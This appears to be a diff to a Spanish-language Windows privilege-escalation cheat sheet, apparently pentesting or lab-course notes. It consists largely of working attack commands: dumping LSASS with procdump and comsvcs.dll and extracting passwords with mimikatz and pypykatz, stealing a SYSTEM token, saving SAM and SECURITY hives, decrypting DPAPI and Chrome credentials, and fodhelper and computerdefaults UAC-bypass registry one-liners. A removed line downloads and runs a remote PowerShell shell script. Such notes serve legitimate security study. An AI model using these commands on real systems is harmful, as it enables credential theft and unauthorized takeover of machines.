@@ -281,20 +281,28 @@ Permite abrir cualquier proceso con acceso total a su memoria, independientement
 Con este privilegio podemos aaceder a la SAM volcando la memoria de LSASS
 ```powershell
 .\procdump.exe -accepteula -ma lsass.exe lsass.dmp # volcar lsass con procdump
-.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full # con rundll
+```
+
+Luego con mimikatz o pypikatz (Linux) se obtienen las contraseñas de ese archivo
+```bash
+.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit # Windows
 # Si no, usar mimikatz # lsadump::secrets
+pypykatz lsa minidump ./lsass.dmp # Linuz
 ```
 
 > GUI: `Administrador de Tareas 🡆 Details 🡆 LSASS 🡆 Create dump file`
 
-Otra manera es con el script de este [repo](https://github.com/decoder-it/psgetsystem)
+> [!NOTE]
+> Tambien podemos obtener RCE con `SeDebugPrivilege` lanzando un proceso hijo y heredar el token de un proceso padre que se ejecuta como SYSTEM.
+
+Utilizaremos el script de este [repo](https://github.com/decoder-it/psgetsystem)
 ```powershell
-psgetsys.ps1;
-(Get-Process ¨"lssass").Id # Pid lsass
-[MyProcess]::CreateProcessFromParent(<PID_proceso_system>,<ruta_cmd.exe>,"")
+(Get-Process ¨"lssass").Id # Pid lsass, ej 612
+PS> . .\psgetsys.ps1 
+PS> ImpersonateFromParentPid -ppid 612 -command 'C:\Windows\System32\cmd.exe' -cmdargs ""
 ```
 
-`0.0.0.0| powershell -ExecutionPolicy Bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.244/shell.ps1')`
 
 ------
 ## 3.2. SeBackupPrivilege
@@ -308,9 +316,11 @@ Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 Set-SeBackupPrivilege # Habilitar el privilegio en la sesión actual
 Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
-reg save HKLM\system system & reg save HKLM\sam sam # Copiar las hives
 
+reg save HKLM\system system & reg save HKLM\sam sam # Copiar las hives
+reg save HKLM\security security # Opcional, claves de máquina y de usuario para DPAPI.
 impacket-secretsdump -system SYSTEM -sam SAM LOCAl  # Acceder al registro
+# -security security
 ```
 
 Diskshadow:
@@ -324,6 +334,12 @@ DISKSHADOW> create
 DISKSHADOW> expose %cdrive% E:
 DISKSHADOW> end backup
 ```
+
+Podemos romper contraseñas cifradas con `DPAPI` con mimikatz
+```bash
+cmd: mimikatz.exe 'dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect' 'exit'
+```
+ 
 
 ------
 ## 3.3. SeRestorePrivilege
@@ -396,6 +412,8 @@ El UAC puede estar en estos modos
 | **Notify me only when apps try to make changes**                            |            ✅             |                         ✅                         |                 ❌                  | 🟠        |
 | **Notify me only when apps try to make changes without dimming my desktop** |            ❌             |                         ✅                         |                 ❌                  | 🟡        |
 | **Never Notify** (Desactivado)                                              |            ❌             |                         ❌                         |                 ❌                  | 🔴        |
+
+
 Para ver el nivel del UAC y la version de compilación de nuestro sistema, podemos ejecutar:
 ```c
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
@@ -413,8 +431,22 @@ Técnicas
 - **Elevated COM Interfaces:** Se abusa de objetos COM configurados para auto-aprovar la escalada de privilegios sin pedir permiso al usuario
 - **Windows Directory Mocking:**  Se coloca código malicioso en sitios donde procesos del sistema que se auto elevan buscan encontrar archivos legitimos.
 
+
+----
+## 4.1 Usando fodhelper o computerdefaults
+Con `fodhelper.exe`
+
+```
+reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe
+```
+
+Usando `computerdefaults.exe`:
+```
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
+```
+
 ------
-## 4.1 UACME
+## 4.2 UACME
 
 Descargamos este [repo]([https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME) y lo compilamos con las opciones en `Project 🡆 Properties 🡆 General` `Windows 10 SDK` y `Platform ToolSet v145`
 
@@ -424,7 +456,7 @@ Tambien tenemos este [script](https://github.com/FuzzySecurity/PowerShell-Suite/
 
 
 ------------
-## 4.2 DLL inyection
+## 4.3 DLL inyection
 
 > [!CAUTION]
 Podemos hacer una inyección de DLL en un programa como `SystemPropertiesAdvanced.exe`, el cual trata de cargar la DLL `srrstr.dll` de la función `System Restore`. **Este programa se autoeleva sin saltar el UAC.**
@@ -633,17 +665,68 @@ En contra de las mejores prácticas, las aplicaciones a menudo almacenan contras
 ## 6.1. Buscar archivos
 
 ```bash
-cd C:/Users/; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml | findstr -v "C__WINDOWS_SystemApps Cortana Windows.Search_ InboxTemplates"
+cd C:/Users/; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml | findstr -v "C__WINDOWS_SystemApps Cortana Windows.Search_ InboxTemplates"
+
+cd C://; findstr /S /I /M /C:"newuser" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 ```
 
 -------------
-## 6.2. Contraseñas en scripts
-Tenemos un archivo llamado `pass.xml` con la string `System.Management.Automation.PSCredential` y abajo una contraseña cifrada. Entonces solo tenemos que poner estos comandos para descifrarla
+## 6.2. DPAPI
+
+DPAPI son siglas de API de "protección de datos" y es un cojjunto de funciones del sistema que los programas (de windows y de terceros) usan para cifrar y descifrar datos por usuario. 
+
+#### Descifrar DPAPI
+Si nos encontramos enumerando que la masterkey de DPAPi está disponible, podremos crackear archivos
+```bash
+ls %UserProfile%\AppData\Roaming\Microsoft\Credentials # masterkey de DPAPI 🡆 772275FA...
+ls %UserProfile%\AppData\Roaming\Microsoft\Protect\<SID> #  Archivo cifrado 🡆 0894938...
+
+impacket-dpapi masterkey <masterkey> -file <archivo> -sid <sid> -password <pass> # Decrypted key 
+impacket-dpapi credential -file <archivo> -key <clave>
+
+# DonPapi o Nxc lo hacen de manera automática:
+DonPAPI collect -u <usuario> -p <contraseña> -t 172.16.20.2 # Con PtH -H "<hash>"
+nxc smb 172.16.20.2 -u administrator -p <contraseña> --dpapi
+mimikatz 'dpapi::masterkey /in:.\masterkey /sid:<sid> /password:<pass>' 'exit'
+mimikatz 'dpapi::cred /in:.\cred.txt'
+```
+
+
+#### Credential manager y vault
+Para extraer credenciales del credential manager podemos usar 
+```bash
+cmd> cmdkey /list
+# Target: Domain:interactive=SRV01\mcharles  🡆 credencial de dominio interactiva 🡆 runas
+# Type: Domain Password 
+# User: SRV01\mcharles
+cmd> runas /savecred /user:SRV01\mcharles cmd
+```
+
+Puede que este usuario sea miembro de un grupo privilegiado.
+
+Para extraer credenciales del vault y credential manager, debemos tener los privilegios activos y ejecutar mimikatz `vault::cred` y `sekurlsa::credman`
+
+--------
+#### Credenciales en scrips
+Tenemos un archivo llamado `pass.xml` con la string `System.Management.Automation.PSCredential` (DPAPI) y abajo una contraseña cifrada. Entonces solo tenemos que poner estos comandos para descifrarla
 ```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
 PS C:\> $credential.GetNetworkCredential().password
 # Str0ng3ncryptedP@ss!
 ```
+
+
+--------
+#### Herramientas
+Otras herramientas que podemos usar son: 
+```bash
+SharpChrome.exe logins /unprotect
+Sharpup.exe audit
+LaZagne all
+SessionGopher
+SharpDPAPI
+```
+
 
 ------
 ## 6.2. Historial, winlogon y unattend
@@ -651,7 +734,6 @@ Podemos buscar en el historial:
 ```bash
 powershell.exe -c "sls (Get-PSReadLineOption).HistorySavePath -Pattern '/p','pass'"
 ```
-El comando `cmdkey` se puede utilizar para crear, listar y eliminar nombres de usuario y contraseñas almacenados. Esto puede ser util para conectarse por RDP o SSH por ejemplo
 
 Es tambien muy famoso el `Unnatend.xml` o el `Autologon` o las credenciales de PuTTy
 ```bash
@@ -666,8 +748,8 @@ netsh wlan show profile
 netsh wlan show profile ilfreight_corp key=clear
 ```
 
-----------
-## 6.3. Otros formatos
+---
+## 6.4. Otros formatos
 Para bases de datos SQLite (como las de sticky notes):
 ```bash
 # Buscar si hay
@@ -684,18 +766,9 @@ O por archivos kdbx (keepass). Aunque podemos usar Snaffler en entornos DC
 dir C:\*.kdbx  /s /b 2>nul
 ```
 
--------
-## 6.3. Herramientas
-Otras herramientas que podemos usar son: `SharpChrome.exe` `Sharpup.exe` `LaZagne`  o `SessionGopher`
-```bash
-SharpChrome.exe logins /unprotect
-Sharpup.exe audit
-LaZagne all
-```
-
 Para sniffar credenciales de una captura pcap podemos usar **[net-creds](https://github.com/DanMcInerney/net-creds)**
 
------------
+-------
 # 7. Otros
 
 ## 7.1. SCF en un recurso compartido de archivos
@@ -741,7 +814,8 @@ powershell "gp 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HK
 
 Vemos que está instalado `mRemoteNG` (una herramienta para conectarse a sistemas remotos con varios protoocolos). Guarda información y credenciales en el archivo  `%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml`.  
 
-Este documento XML contiene un elemento raíz llamado `Connections` con la información sobre el cifrado utilizado para las credenciales y el atributo `Protected`, la contraseña maestra utilizada para cifrar el documento. Los elementos `Node` tienen información del sistema remoto, nombre de usuario, protocolo y la contraseña cifrada con la contraseña maestra.
+> [!NOTE]
+> Este documento XML contiene un elemento raíz llamado `Connections` con la información sobre el cifrado utilizado para las credenciales y el atributo `Protected`, la contraseña maestra utilizada para cifrar el documento. Los elementos `Node` tienen información del sistema remoto, nombre de usuario, protocolo y la contraseña cifrada con la contraseña maestra.
 
 Si el usuario no estableció una contraseña maestra personalizada, podemos usar el script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) para descifrar la contraseña. 
 ```bash
@@ -876,7 +950,7 @@ sudo python3 windows-exploit-suggester.py --update
 python3 windows-exploit-suggester.py  --systeminfo sysinfo.txt 
 ```
 
-# 5. 🔍 Enumeración inicial — ¿Por dónde empezar?
+# 8. 🔍 Enumeración inicial — ¿Por dónde empezar?
 
 Herramientas automáticas de enumeración En lugar de lanzar los comandos uno a uno, estas herramientas automatizan toda la enumeración:
 - **WinPEAS** — enumeración exhaustiva, colorea los hallazgos por criticidad
